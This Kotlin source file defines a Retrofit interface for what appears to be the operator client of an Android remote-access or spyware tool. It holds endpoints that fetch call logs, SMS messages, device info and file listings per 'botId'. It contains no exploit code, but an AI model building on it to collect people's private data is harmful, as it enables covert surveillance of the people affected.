package com.github.yohannestz.popovclient.data.remote

import com.github.yohannestz.popovclient.data.model.GetCallsResponse
import com.github.yohannestz.popovclient.data.model.GetDeviceInfoResponse
import com.github.yohannestz.popovclient.data.model.GetHeartBeatResponse
import com.github.yohannestz.popovclient.data.model.GetSmsResponse
import com.github.yohannestz.popovclient.data.model.QueryFilesResponse
import com.github.yohannestz.popovclient.util.Constants
import retrofit2.Response
import retrofit2.http.GET
import retrofit2.http.Query


interface NetworkService {

    @GET(Constants.GET_CALLS_ROUTE)
    suspend fun getCalls(@Query("botId") botId: String): Response<GetCallsResponse>

    @GET(Constants.GET_SMS_ROUTE)
    suspend fun getSms(@Query("botId") botId: String): Response<GetSmsResponse>

    @GET(Constants.GET_DEVICE_INFO_ROUTE)
    suspend fun getDeviceInfo(@Query("botId") botId: String): Response<GetDeviceInfoResponse>

    @GET(Constants.QUERY_FILES_ROUTE)
    suspend fun queryFiles(@Query("botId") botId: String): Response<QueryFilesResponse>

    @GET(Constants.GET_BOT_HEARTBEAT_ROUTE)
    suspend fun getHeartBeat(@Query("botId") botId: String): Response<GetHeartBeatResponse>
}